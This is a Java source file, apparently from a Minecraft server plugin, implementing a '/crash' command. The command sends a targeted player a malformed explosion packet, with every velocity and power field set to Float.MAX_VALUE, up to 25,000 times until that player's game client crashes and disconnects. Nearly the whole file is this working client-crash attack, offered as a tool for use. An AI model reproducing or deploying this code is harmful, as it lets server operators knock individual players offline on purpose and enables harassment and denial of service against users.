package cn.ChengZhiYa.MHDFTools.command.subCommand.misc;

import cn.ChengZhiYa.MHDFTools.utils.map.MapUtil;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;

import static cn.ChengZhiYa.MHDFTools.utils.SpigotUtil.i18n;

public final class Crash implements CommandExecutor {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
        if (args.length != 1) {
            sender.sendMessage(i18n("Usage.Crash", label));
            return false;
        }

        String playerName = args[0];
        Player player = Bukkit.getPlayer(playerName);

        if (player == null) {
            sender.sendMessage(i18n("PlayerNotOnline"));
            return false;
        }

        if (MapUtil.getStringHasMap().get(playerName + "_Crash") != null) {
            sender.sendMessage(i18n("Crash.RepeatExecution"));
            return false;
        }

        sender.sendMessage(i18n("Crash.Execution"));
        MapUtil.getStringHasMap().put(player.getName() + "_Crash", "崩端ing");

        PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
        packetContainer.getModifier().writeDefaults();
        packetContainer.getFloat().write(0, (float) player.getLocation().getX());
        packetContainer.getFloat().write(1, (float) player.getLocation().getY());
        packetContainer.getFloat().write(2, (float) player.getLocation().getZ());
        packetContainer.getSpecificModifier(List.class).write(0, new ArrayList<>());
        packetContainer.getFloat().write(0, Float.MAX_VALUE);
        packetContainer.getFloat().write(1, Float.MAX_VALUE);
        packetContainer.getFloat().write(2, Float.MAX_VALUE);
        packetContainer.getFloat().write(3, Float.MAX_VALUE);

        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
        for (int i = 0; i < 25000; i++) {
            ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, true);
            if (!player.isOnline()) {
                break;
            }
        }

        MapUtil.getStringHasMap().put(player.getName() + "_Crash", null);
        return true;
    }
}